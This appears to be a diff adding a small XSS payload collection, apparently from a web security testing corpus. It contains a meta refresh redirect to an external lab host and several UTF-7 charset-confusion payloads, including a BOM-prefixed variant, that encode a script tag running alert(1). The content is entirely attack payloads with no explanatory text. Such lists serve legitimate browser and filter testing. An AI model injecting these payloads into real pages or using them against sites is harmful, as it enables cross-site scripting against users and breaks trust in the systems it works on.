@@ -1,0 +1,6 @@
+<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">
+<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
++/v8+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="referrer" content="no-referrer">
